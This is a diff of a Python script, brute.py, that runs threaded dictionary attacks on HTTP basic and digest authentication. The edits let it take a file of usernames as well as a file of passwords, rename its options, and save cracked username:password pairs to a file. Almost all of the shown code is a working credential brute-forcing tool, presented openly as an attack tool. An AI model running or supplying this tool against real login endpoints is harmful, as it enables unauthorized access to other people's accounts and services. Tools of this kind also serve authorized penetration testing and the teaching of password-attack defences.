@@ -18,11 +18,11 @@ def banner():
 
 def usage():
     print ("Usage: ")
-    print ("    -w: url (https://test.com)")
-    print ("    -u: username")
-    print ("    -f: dictionary file")
+    print ("    -t: target (https://test.com)")
+    print ("    -u: file with usernames")
+    print ("    -p: file with passwords")
     print ("    -m: method (basic or digest)")
-    print ("Example: brute.py -w http://test.com -u admin -f passwords.txt -m method")
+    print ("Example: brute.py -t http://test.com -u admin -p passwords.txt -m method")
 
 class request_performer(Thread):
     def __init__(self,passwd,user,url,method):
@@ -42,17 +42,23 @@ class request_performer(Thread):
                 elif self.method == "digest":
                     res = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password)  )
 
+
                 if res.status_code == 200:
                     hit = "0"
-                    print ("[+] Pssword Found: " + self.password)
+                    print(f"\n[+] Password Found: {self.username}:{self.password}")
+                    
+                    with open("found_credentials.txt", "a") as f:
+                            f.write(f"{self.username}:{self.password}\n")
+                        
                     sys.exit()
                 else:
-                    print ("[-] Not valid password: " + self.password)
-                    i[0] = i[0]-1
+                    # overwrite line
+                    # sys.stdout.write("\r" + " " * len(output) + "\r")
+                    # sys.stdout.flush()
+                    i[0] -= 1
+
             except Exception as e:
                 print (e)                  
-
-
 
 
 def start(argv):
@@ -61,48 +67,59 @@ def start(argv):
         usage()
         sys.exit()
     try:
-            opts, args = getopt.getopt(argv, "u:w:f:m:")   
+        opts, args = getopt.getopt(argv, "u:t:p:m:")
     except getopt.GetoptError:
-        print ("[!!] Error on Arguments!")
-        sys.exit() 
+        print("[!!] Error on Arguments!")
+        sys.exit()
 
     for opt, arg in opts:
         if opt == '-u':
-            username = arg
-        elif opt == '-w':
+            users_file = arg
+        elif opt == '-t':
             url = arg
-        elif opt == '-f':
-            dictionary = arg 
+        elif opt == '-p':
+            passwords_file = arg
         elif opt == '-m':
             method = arg
 
     try:
-        f = open(dictionary,"r")
-        passwords = f.readlines()
+        with open(passwords_file, "r") as f:
+            passwords = f.readlines()
     except:
-        print ("[!!] file dosnt Exist, please check if the path is correct!")  
+        print("[!!] Password file doesn't exist!")
         sys.exit()
-    launcher_threads(passwords,threads,username,url,method)
 
-def launcher_threads(passwords,threads,username,url,method):
-    global i
-    i = []
-    i.append(0)
+    try:
+        with open(users_file, "r") as f:
+            usernames = [line.strip() for line in f.readlines()]
+    except:
+        print("[!!] User file doesn't exist!")
+        sys.exit()
+
+    for username in usernames:
+        print(f"[*] Trying user: {username}")
+        launcher_threads(passwords.copy(), threads, username, url, method)
+
+def launcher_threads(passwords, threads, username, url, method):
+    global i, hit
+    i = [0]
+    hit = "1"
     while len(passwords):
         if hit == "1":
             try:
                 if i[0] < threads:
                     passwd = passwords.pop(0)
-                    i[0] = i[0]+1
-                    thread = request_performer(passwd, username, url,method)
+                    i[0] += 1
+                    thread = request_performer(passwd, username, url, method)
                     thread.start()
             except KeyboardInterrupt:
-                print ("[!!] Interrupted!")
+                print("[!!] Interrupted!")
                 sys.exit()
             thread.join()
         if hit == "0":
-            print ("[+] Attack finished!")
-            sys.exit()
+            print("[+] Attack finished for user:", username)
+            return
+        
 
 if __name__ == "__main__":
     try:
